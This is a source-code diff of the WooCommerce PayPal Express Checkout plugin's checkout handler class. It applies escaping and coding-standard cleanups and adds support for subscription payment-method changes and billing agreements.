-					<input class="input-checkbox" id="createaccount" <?php checked( ( true === $checkout->get_value( 'createaccount' ) || ( true === apply_filters( 'woocommerce_create_account_default_checked', false ) ) ), true) ?> type="checkbox" name="createaccount" value="1" /> <label for="createaccount" class="checkbox"><?php _e( 'Create an account?', '' ); ?></label>
+					<input class="input-checkbox" id="createaccount" <?php checked( ( true === $checkout->get_value( 'createaccount' ) || ( true === apply_filters( 'woocommerce_create_account_default_checked', false ) ) ), true ); ?> type="checkbox" name="createaccount" value="1" /> <label for="createaccount" class="checkbox"><?php esc_html_e( 'Create an account?', 'woocommerce-gateway-paypal-express-checkout' ); ?></label>
 				</p>
 				<?php
 			}
@@ -302,7 +303,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 				?>
 				<div class="create-account">
 
-					<p><?php _e( 'Create an account by entering the information below. If you are a returning customer please login at the top of the page.', 'woocommerce' ); ?></p>
+					<p><?php esc_html_e( 'Create an account by entering the information below. If you are a returning customer please login at the top of the page.', 'woocommerce-gateway-paypal-express-checkout' ); ?></p>
 
 					<?php foreach ( $checkout->checkout_fields['account'] as $key => $field ) : ?>
 
@@ -315,7 +316,6 @@ class WC_Gateway_PPEC_Checkout_Handler {
 				</div>
 				<?php
 			}
-
 		}
 	}
 
@@ -327,8 +327,8 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * Is hooked to woocommerce_checkout_shipping action by checkout_init
 	 */
 	public function paypal_shipping_details() {
-		$session          = WC()->session->get( 'paypal' );
-		$token            = isset( $_GET['token'] ) ? $_GET['token'] : $session->token;
+		$session = WC()->session->get( 'paypal' );
+		$token   = isset( $_GET['token'] ) ? $_GET['token'] : $session->token; // phpcs:ignore WordPress.Security.NonceVerification.Recommended,WordPress.Security.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 
 		try {
 			$checkout_details = $this->get_checkout_details( $token );
@@ -342,9 +342,9 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		}
 
 		?>
-		<h3><?php _e( 'Shipping details', 'woocommerce-gateway-paypal-express-checkout' ); ?></h3>
+		<h3><?php esc_html_e( 'Shipping details', 'woocommerce-gateway-paypal-express-checkout' ); ?></h3>
 		<?php
-		echo WC()->countries->get_formatted_address( $this->get_mapped_shipping_address( $checkout_details ) );
+		echo WC()->countries->get_formatted_address( $this->get_mapped_shipping_address( $checkout_details ) ); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
 	}
 
 	/**
@@ -369,8 +369,8 @@ class WC_Gateway_PPEC_Checkout_Handler {
 
 		if ( ! empty( $checkout_details->payer_details->phone_number ) ) {
 			$phone = $checkout_details->payer_details->phone_number;
-		} elseif ( 'yes' === wc_gateway_ppec()->settings->require_phone_number && ! empty( $_POST['billing_phone'] ) ) {
-			$phone = wc_clean( $_POST['billing_phone'] );
+		} elseif ( 'yes' === wc_gateway_ppec()->settings->require_phone_number && ! empty( $_POST['billing_phone'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Missing
+			$phone = wc_clean( $_POST['billing_phone'] ); // phpcs:ignore WordPress.Security.NonceVerification.Missing,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 		}
 
 		return array(
@@ -402,29 +402,41 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		$name       = explode( ' ', $checkout_details->payments[0]->shipping_address->getName() );
 		$first_name = array_shift( $name );
 		$last_name  = implode( ' ', $name );
-		return array(
-			'first_name'    => $first_name,
-			'last_name'     => $last_name,
-			'company'       => $checkout_details->payer_details->business_name,
-			'address_1'     => $checkout_details->payments[0]->shipping_address->getStreet1(),
-			'address_2'     => $checkout_details->payments[0]->shipping_address->getStreet2(),
-			'city'          => $checkout_details->payments[0]->shipping_address->getCity(),
-			'state'         => $checkout_details->payments[0]->shipping_address->getState(),
-			'postcode'      => $checkout_details->payments[0]->shipping_address->getZip(),
-			'country'       => $checkout_details->payments[0]->shipping_address->getCountry(),
+		$result     = array(
+			'first_name' => $first_name,
+			'last_name'  => $last_name,
+			'address_1'  => $checkout_details->payments[0]->shipping_address->getStreet1(),
+			'address_2'  => $checkout_details->payments[0]->shipping_address->getStreet2(),
+			'city'       => $checkout_details->payments[0]->shipping_address->getCity(),
+			'state'      => $checkout_details->payments[0]->shipping_address->getState(),
+			'postcode'   => $checkout_details->payments[0]->shipping_address->getZip(),
+			'country'    => $checkout_details->payments[0]->shipping_address->getCountry(),
 		);
+		if ( ! empty( $checkout_details->payer_details ) && property_exists( $checkout_details->payer_details, 'business_name' ) ) {
+			$result['company'] = $checkout_details->payer_details->business_name;
+		}
+		return $result;
 	}
 
 	/**
 	 * Checks data is correctly set when returning from PayPal Checkout
 	 */
 	public function maybe_return_from_paypal() {
-		if ( empty( $_GET['woo-paypal-return'] ) || empty( $_GET['token'] ) || empty( $_GET['PayerID'] ) ) {
+		// phpcs:disable WordPress.Security.NonceVerification.Recommended
+		if (
+			isset( $_GET['woo-paypal-return'] )
+			&& isset( $_GET['update_subscription_payment_method'] )
+			&& 'true' === $_GET['update_subscription_payment_method']
+		) {
+			$this->handle_subscription_payment_change_success();
 			return;
 		}
 
-		$token                    = $_GET['token'];
-		$payer_id                 = $_GET['PayerID'];
+		if ( empty( $_GET['woo-paypal-return'] ) || empty( $_GET['token'] ) ) {
+			return;
+		}
+
+		$token                    = $_GET['token']; // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 		$create_billing_agreement = ! empty( $_GET['create-billing-agreement'] );
 		$session                  = WC()->session->get( 'paypal' );
 
@@ -435,8 +447,16 @@ class WC_Gateway_PPEC_Checkout_Handler {
 
 		// Store values in session.
 		$session->checkout_completed = true;
-		$session->payer_id           = $payer_id;
 		$session->token              = $token;
+
+		if ( ! empty( $_GET['PayerID'] ) ) {
+			$session->payer_id = $_GET['PayerID']; // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
+		} elseif ( $create_billing_agreement ) {
+			$session->create_billing_agreement = true;
+		} else {
+			return;
+		}
+		// phpcs:enable
 
 		// Update customer addresses here from PayPal selection so they can be used to calculate local taxes.
 		$this->update_customer_addresses_from_paypal( $token );
@@ -457,13 +477,17 @@ class WC_Gateway_PPEC_Checkout_Handler {
 				}
 
 				// Complete the payment now.
-				$this->do_payment( $order, $session->token, $session->payer_id );
+				if ( ! empty( $session->payer_id ) ) {
+					$this->do_payment( $order, $session->token, $session->payer_id );
+				} elseif ( $order->get_total() <= 0 ) {
+					$order->payment_complete();
+				}
 
 				// Clear Cart
 				WC()->cart->empty_cart();
 
 				// Redirect
-				wp_redirect( $order->get_checkout_order_received_url() );
+				wp_redirect( $order->get_checkout_order_received_url() ); // phpcs:ignore WordPress.Security.SafeRedirect.wp_redirect_wp_redirect
 				exit;
 			}
 		} catch ( PayPal_API_Exception $e ) {
@@ -506,19 +530,23 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		$customer = WC()->customer;
 
 		// Update billing/shipping addresses.
-		$customer->set_billing_address( $billing_details['address_1'] );
-		$customer->set_billing_address_2( $billing_details['address_2'] );
-		$customer->set_billing_city( $billing_details['city'] );
-		$customer->set_billing_postcode( $billing_details['postcode'] );
-		$customer->set_billing_state( $billing_details['state'] );
-		$customer->set_billing_country( $billing_details['country'] );
+		if ( ! empty( $billing_details ) ) {
+			$customer->set_billing_address( $billing_details['address_1'] );
+			$customer->set_billing_address_2( $billing_details['address_2'] );
+			$customer->set_billing_city( $billing_details['city'] );
+			$customer->set_billing_postcode( $billing_details['postcode'] );
+			$customer->set_billing_state( $billing_details['state'] );
+			$customer->set_billing_country( $billing_details['country'] );
+		}
 
-		$customer->set_shipping_address( $shipping_details['address_1'] );
-		$customer->set_shipping_address_2( $shipping_details['address_2'] );
-		$customer->set_shipping_city( $shipping_details['city'] );
-		$customer->set_shipping_postcode( $shipping_details['postcode'] );
-		$customer->set_shipping_state( $shipping_details['state'] );
-		$customer->set_shipping_country( $shipping_details['country'] );
+		if ( ! empty( $shipping_details ) ) {
+			$customer->set_shipping_address( $shipping_details['address_1'] );
+			$customer->set_shipping_address_2( $shipping_details['address_2'] );
+			$customer->set_shipping_city( $shipping_details['city'] );
+			$customer->set_shipping_postcode( $shipping_details['postcode'] );
+			$customer->set_shipping_state( $shipping_details['state'] );
+			$customer->set_shipping_country( $shipping_details['country'] );
+		}
 	}
 
 	/**
@@ -539,16 +567,15 @@ class WC_Gateway_PPEC_Checkout_Handler {
 					unset( $gateways[ $id ] );
 				}
 			}
-
-		// If using PayPal standard (this is admin choice) we don't need to also show PayPal EC on checkout.
 		} elseif ( is_checkout() && ( isset( $gateways['paypal'] ) || 'no' === wc_gateway_ppec()->settings->mark_enabled ) ) {
+			// If using PayPal standard (this is admin choice) we don't need to also show PayPal EC on checkout.
 			unset( $gateways['ppec_paypal'] );
 		}
 
 		// If the cart total is zero (e.g. because of a coupon), don't allow this gateway.
 		// We do this only if we're on the checkout page (is_checkout), but not on the order-pay page (is_checkout_pay_page)
 		if ( is_cart() || ( is_checkout() && ! is_checkout_pay_page() ) ) {
-			if ( isset( $gateways['ppec_paypal'] ) && ( 0 >= WC()->cart->total ) ) {
+			if ( isset( $gateways['ppec_paypal'] ) && ! WC()->cart->needs_payment() ) {
 				unset( $gateways['ppec_paypal'] );
 			}
 		}
@@ -582,10 +609,21 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * Clears the session data and display notice.
 	 */
 	public function maybe_cancel_checkout_with_paypal() {
-		if ( is_cart() && ! empty( $_GET['wc-gateway-ppec-clear-session'] ) ) {
+		// phpcs:disable WordPress.Security.NonceVerification.Recommended
+		if (
+			isset( $_GET['update_subscription_payment_method'] )
+			&& 'true' === $_GET['update_subscription_payment_method']
+			&& isset( $_GET['woo-paypal-cancel'] )
+		) {
+			$this->handle_subscription_payment_change_failure();
+			return;
+		}
+		// phpcs:enable
+
+		if ( is_cart() && ! empty( $_GET['wc-gateway-ppec-clear-session'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
 			$this->maybe_clear_session_data();
 
-			$notice =  __( 'You have cancelled Checkout with PayPal. Please try to process your order again.', 'woocommerce-gateway-paypal-express-checkout' );
+			$notice = __( 'You have cancelled Checkout with PayPal. Please try to process your order again.', 'woocommerce-gateway-paypal-express-checkout' );
 			if ( ! wc_has_notice( $notice, 'notice' ) ) {
 				wc_add_notice( $notice, 'notice' );
 			}
@@ -631,7 +669,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		}
 
 		$session = WC()->session->paypal;
-		return ( is_a( $session, 'WC_Gateway_PPEC_Session_Data' ) && $session->payer_id && $session->expiry_time > time() );
+		return ( is_a( $session, 'WC_Gateway_PPEC_Session_Data' ) && ( $session->payer_id || ! empty( $session->create_billing_agreement ) ) && $session->expiry_time > time() );
 	}
 
 	/**
@@ -686,8 +724,9 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * @return string Redirect URL.
 	 */
 	protected function start_checkout( $context_args, $session_data_args ) {
-		$settings     = wc_gateway_ppec()->settings;
-		$client       = wc_gateway_ppec()->client;
+		$settings = wc_gateway_ppec()->settings;
+		$client   = wc_gateway_ppec()->client;
+
 		$context_args['create_billing_agreement'] = $this->needs_billing_agreement_creation( $context_args );
 
 		$params   = $client->get_set_express_checkout_params( $context_args );
@@ -710,7 +749,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * @return string Redirect URL.
 	 */
 	public function start_checkout_from_cart( $skip_checkout = true ) {
-		$settings     = wc_gateway_ppec()->settings;
+		$settings = wc_gateway_ppec()->settings;
 
 		$context_args = array(
 			'skip_checkout' => $skip_checkout,
@@ -734,7 +773,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * @return string Redirect URL.
 	 */
 	public function start_checkout_from_order( $order_id, $use_ppc ) {
-		$settings     = wc_gateway_ppec()->settings;
+		$settings = wc_gateway_ppec()->settings;
 
 		$context_args = array(
 			'skip_checkout' => false,
@@ -794,8 +833,8 @@ class WC_Gateway_PPEC_Checkout_Handler {
 			return $this->_checkout_details;
 		}
 
-		if ( false === $token && ! empty( $_GET['token'] ) ) {
-			$token = $_GET['token'];
+		if ( false === $token && ! empty( $_GET['token'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
+			$token = $_GET['token']; // phpcs:ignore WordPress.Security.NonceVerification.Recommended,WordPress.Security.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 		}
 
 		$client   = wc_gateway_ppec()->client;
@@ -835,7 +874,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 			throw new PayPal_API_Exception( $resp );
 		}
 
-		$old_wc = version_compare( WC_VERSION, '3.0', '<' );
+		$old_wc   = version_compare( WC_VERSION, '3.0', '<' );
 		$order_id = $old_wc ? $order->id : $order->get_id();
 		if ( $old_wc ) {
 			update_post_meta( $order_id, '_ppec_billing_agreement_id', $resp['BILLINGAGREEMENTID'] );
@@ -861,21 +900,22 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * Complete a payment that has been authorized via PPEC.
 	 */
 	public function do_payment( $order, $token, $payer_id ) {
-		$settings     = wc_gateway_ppec()->settings;
 		$session_data = WC()->session->get( 'paypal', null );
 
 		if ( ! $order || null === $session_data || $this->session_has_expired( $token ) || empty( $payer_id ) ) {
 			throw new PayPal_Missing_Session_Exception();
 		}
 
-		$client = wc_gateway_ppec()->client;
-		$old_wc = version_compare( WC_VERSION, '3.0', '<' );
+		$client   = wc_gateway_ppec()->client;
+		$old_wc   = version_compare( WC_VERSION, '3.0', '<' );
 		$order_id = $old_wc ? $order->id : $order->get_id();
-		$params = $client->get_do_express_checkout_params( array(
-			'order_id' => $order_id,
-			'token'    => $token,
-			'payer_id' => $payer_id,
-		) );
+		$params   = $client->get_do_express_checkout_params(
+			array(
+				'order_id' => $order_id,
+				'token'    => $token,
+				'payer_id' => $payer_id,
+			)
+		);
 
 		$response = $client->do_express_checkout_payment( $params );
 
@@ -883,38 +923,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 			$payment_details = new PayPal_Payment_Details();
 			$payment_details->loadFromDoECResponse( $response );
 
-			$meta = $old_wc ? get_post_meta( $order_id, '_woo_pp_txnData', true ) : $order->get_meta( '_woo_pp_txnData', true );
-			if ( ! empty( $meta ) ) {
-				$txnData = $meta;
-			} else {
-				$txnData = array( 'refundable_txns' => array() );
-			}
-
-			$paymentAction = $settings->get_paymentaction();
-
-			$txn = array(
-				'txnID'           => $payment_details->payments[0]->transaction_id,
-				'amount'          => $order->get_total(),
-				'refunded_amount' => 0
-			);
-			if ( 'Completed' == $payment_details->payments[0]->payment_status ) {
-				$txn['status'] = 'Completed';
-			} else {
-				$txn['status'] = $payment_details->payments[0]->payment_status . '_' . $payment_details->payments[0]->pending_reason;
-			}
-			$txnData['refundable_txns'][] = $txn;
-
-			if ( 'authorization' == $paymentAction ) {
-				$txnData['auth_status'] = 'NotCompleted';
-			}
-
-			$txnData['txn_type'] = $paymentAction;
-
-			if ( $old_wc ) {
-				update_post_meta( $order_id, '_woo_pp_txnData', $txnData );
-			} else {
-				$order->update_meta_data( '_woo_pp_txnData', $txnData );
-			}
+			wc_gateway_ppec_save_transaction_data( $order, $response, 'PAYMENTINFO_0_' );
 
 			// Payment was taken so clear session
 			$this->maybe_clear_session_data();
@@ -939,13 +948,14 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		// Handle $payment response
 		if ( 'completed' === strtolower( $payment->payment_status ) ) {
 			$order->payment_complete( $payment->transaction_id );
-			if ( isset( $payment->fee_amount ) ){
+			if ( isset( $payment->fee_amount ) ) {
 				wc_gateway_ppec_set_transaction_fee( $order, $payment->fee_amount );
 			}
 		} else {
 			if ( 'authorization' === $payment->pending_reason ) {
 				$order->update_status( 'on-hold', __( 'Payment authorized. Change payment status to processing or complete to capture funds.', 'woocommerce-gateway-paypal-express-checkout' ) );
 			} else {
+				// Translators: placeholder is a reason (from PayPal) for the payment to be pending.
 				$order->update_status( 'on-hold', sprintf( __( 'Payment pending (%s).', 'woocommerce-gateway-paypal-express-checkout' ), $payment->pending_reason ) );
 			}
 			if ( $old_wc ) {
@@ -968,25 +978,30 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * @return mixed
 	 */
 	public function maybe_add_shipping_information( $packages ) {
-		if ( empty( $_GET['woo-paypal-return'] ) || empty( $_GET['token'] ) || empty( $_GET['PayerID'] ) ) {
+		if ( empty( $_GET['woo-paypal-return'] ) || empty( $_GET['token'] ) || empty( $_GET['PayerID'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
 			return $packages;
 		}
 
 		// Shipping details from PayPal
 		try {
-			$checkout_details = $this->get_checkout_details( wc_clean( $_GET['token'] ) );
+			$checkout_details = $this->get_checkout_details( wc_clean( $_GET['token'] ) ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 		} catch ( PayPal_API_Exception $e ) {
 			return $packages;
 		}
 
 		$destination = $this->get_mapped_shipping_address( $checkout_details );
 
-		$packages[0]['destination']['country']   = $destination['country'];
-		$packages[0]['destination']['state']     = $destination['state'];
-		$packages[0]['destination']['postcode']  = $destination['postcode'];
-		$packages[0]['destination']['city']      = $destination['city'];
-		$packages[0]['destination']['address']   = $destination['address_1'];
-		$packages[0]['destination']['address_2'] = $destination['address_2'];
+		if ( ! empty( $destination ) ) {
+			// WC Subscriptions uses string package keys so we need to get the package key dynamically.
+			$package_key = key( $packages );
+
+			$packages[ $package_key ]['destination']['country']   = $destination['country'];
+			$packages[ $package_key ]['destination']['state']     = $destination['state'];
+			$packages[ $package_key ]['destination']['postcode']  = $destination['postcode'];
+			$packages[ $package_key ]['destination']['city']      = $destination['city'];
+			$packages[ $package_key ]['destination']['address']   = $destination['address_1'];
+			$packages[ $package_key ]['destination']['address_2'] = $destination['address_2'];
+		}
 
 		return $packages;
 	}
@@ -1008,8 +1023,13 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		$needs_billing_agreement = false;
 
 		if ( empty( $args['order_id'] ) ) {
-			if ( class_exists( 'WC_Subscriptions_Cart' ) ) {
-				$needs_billing_agreement = WC_Subscriptions_Cart::cart_contains_subscription();
+			if ( class_exists( 'WC_Subscriptions_Cart' ) && function_exists( 'wcs_cart_contains_renewal' ) ) {
+				// Needs a billing agreement if the cart contains a subscription
+				// or a renewal of a subscription
+				$needs_billing_agreement = (
+					WC_Subscriptions_Cart::cart_contains_subscription()
+					|| wcs_cart_contains_renewal()
+				);
 			}
 		} else {
 			if ( function_exists( 'wcs_order_contains_subscription' ) ) {
@@ -1018,9 +1038,13 @@ class WC_Gateway_PPEC_Checkout_Handler {
 			if ( function_exists( 'wcs_order_contains_renewal' ) ) {
 				$needs_billing_agreement = ( $needs_billing_agreement || wcs_order_contains_renewal( $args['order_id'] ) );
 			}
+			// If the order is a subscription, we're updating the payment method.
+			if ( function_exists( 'wcs_is_subscription' ) ) {
+				$needs_billing_agreement = ( $needs_billing_agreement || wcs_is_subscription( $args['order_id'] ) );
+			}
 		}
 
-		return $needs_billing_agreement;
+		return apply_filters( 'woocommerce_paypal_express_checkout_needs_billing_agreement', $needs_billing_agreement );
 	}
 
 	/**
@@ -1072,13 +1096,92 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		$params['wc_ajax_url'] = remove_query_arg( 'wc-ajax', $params['wc_ajax_url'] );
 
 		foreach ( $fields as $field ) {
-			if ( ! empty( $_GET[ $field ] ) ) {
-				$params['wc_ajax_url'] = add_query_arg( $field, $_GET[ $field ], $params['wc_ajax_url'] );
+			if ( ! empty( $_GET[ $field ] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
+				$params['wc_ajax_url'] = add_query_arg( $field, $_GET[ $field ], $params['wc_ajax_url'] ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended,WordPress.Security.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 			}
 		}
 
 		$params['wc_ajax_url'] = add_query_arg( 'wc-ajax', '%%endpoint%%', $params['wc_ajax_url'] );
 
 		return $params;
+	}
+
+	/**
+	 * Handles a success payment method change for a WooCommerce Subscription.
+	 *
+	 * The user has returned back from PayPal after confirming the payment method change.
+	 * This updates the payment method for the subscription and redirects the user back to the
+	 * subscription update page.
+	 *
+	 * @since 1.7.0
+	 */
+	public function handle_subscription_payment_change_success() {
+		try {
+			$session = WC()->session->get( 'paypal' );
+
+			if ( isset( $_GET['token'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
+				$token = sanitize_text_field( wp_unslash( $_GET['token'] ) ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
+			} elseif ( isset( $session->token ) ) {
+				$token = $session->token;
+			}
+
+			if ( ! isset( $token ) ) {
+				return;
+			}
+
+			if ( empty( $session ) || $this->session_has_expired( $token ) ) {
+				wc_add_notice( __( 'Your PayPal checkout session has expired. Please check out again.', 'woocommerce-gateway-paypal-express-checkout' ), 'error' );
+				return;
+			}
+
+			// Get the info we need and create the billing agreement.
+			$order            = wc_get_order( $session->order_id );
+			$checkout_details = $this->get_checkout_details( $token );
+			$this->create_billing_agreement( $order, $checkout_details );
+
+			// Update the payment method for the current subscription.
+			WC_Subscriptions_Change_Payment_Gateway::update_payment_method( $order, 'ppec_paypal' );
+			$success_notice = __( 'The payment method was updated for this subscription.', 'woocommerce-gateway-paypal-express-checkout' );
+
+			// Update the payment method for all subscriptions if that checkbox was checked.
+			if ( wcs_is_subscription( $order ) && WC_Subscriptions_Change_Payment_Gateway::will_subscription_update_all_payment_methods( $order ) ) {
+				WC_Subscriptions_Change_Payment_Gateway::update_all_payment_methods_from_subscription( $order, $payment_method->id );
+				$success_notice = __( 'The payment method was updated for all your current subscriptions.', 'woocommerce-gateway-paypal-express-checkout' );
+			}
+
+			wc_clear_notices();
+			wc_add_notice( $success_notice );
+			wp_safe_redirect( $order->get_view_order_url() );
+			exit;
+		} catch ( PayPal_API_Exception $e ) {
+			wc_clear_notices();
+			wc_add_notice( __( 'There was a problem updating your payment method. Please try again later or use a different payment method.', 'woocommerce-gateway-paypal-express-checkout' ), 'error' );
+			wp_safe_redirect( $order->get_view_order_url() );
+			exit;
+		}
+	}
+
+	/**
+	 * Handles the cancellation of a WooCommerce Subscription payment method change.
+	 *
+	 * The user has returned back from PayPal after cancelling the payment method change.
+	 * This redirects the user back to the subscription page with an error message.
+	 *
+	 * @since 1.7.0
+	 */
+	public function handle_subscription_payment_change_failure() {
+		$session      = WC()->session->get( 'paypal' );
+		$order        = isset( $session->order_id )
+			? wc_get_order( $session->order_id )
+			: false;
+		$redirect_url = is_callable( array( $order, 'get_view_order_url' ) )
+			? $order->get_view_order_url()
+			: false;
+		wc_clear_notices();
+		wc_add_notice( __( 'You have cancelled Checkout with PayPal. The payment method was not updated.', 'woocommerce-gateway-paypal-express-checkout' ), 'error' );
+		if ( $redirect_url ) {
+			wp_safe_redirect( $redirect_url );
+			exit;
+		}
 	}
 }
